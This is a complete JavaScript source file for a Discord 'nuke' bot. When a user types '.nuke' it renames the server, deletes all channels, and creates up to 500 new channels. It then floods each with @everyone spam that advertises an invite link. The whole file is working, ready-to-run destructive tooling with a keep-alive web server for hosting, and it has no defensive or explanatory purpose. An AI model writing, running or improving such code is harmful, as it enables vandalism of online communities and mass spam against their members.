const { Client } = require('discord.js');
const http = require('http');

const client = new Client({
    intents: [1, 512, 32768, 2, 16]
});

const TOKEN = process.env.TOKEN;

http.createServer((req, res) => {
    res.writeHead(200, { 'Content-Type': 'text/plain' });
    res.end('Alive');
}).listen(process.env.PORT || 3000);

client.once('ready', () => {
    console.log(`[+] ${client.user.tag} is ready`);
});

const sleep = ms => new Promise(r => setTimeout(r, ms));

client.on('messageCreate', async (message) => {
    if (message.author.bot) return;
    if (message.content !== '.nuke') return;

    message.delete().catch(() => {});
    const g = message.guild;

    g.setName('MOON OWNS U').catch(() => {});

    const channels = Array.from(g.channels.cache.values());
    for (const ch of channels) {
        ch.delete().catch(() => {});
        await sleep(100);
    }

    for (let i = 0; i < 500; i++) {
        g.channels.create({ name: 'moon-owns-u', type: 0 }).then(ch => {
            if (!ch) return;
            for (let j = 0; j < 10; j++) {
                ch.send(
                    '@everyone @here discord.gg/vyngg https://cdn.discordapp.com/attachments/1138689071569444886/1290703239918129293/togif.gif?ex=69ef8690&is=69ee3510&hm=d1dbbf53c1ecc34d8e1058d2faebb76347792f01972da9c4099ce6b1b30d23a4&'
                ).catch(() => {});
            }
        }).catch(() => {});
        await sleep(200);
    }
});

client.login(TOKEN);
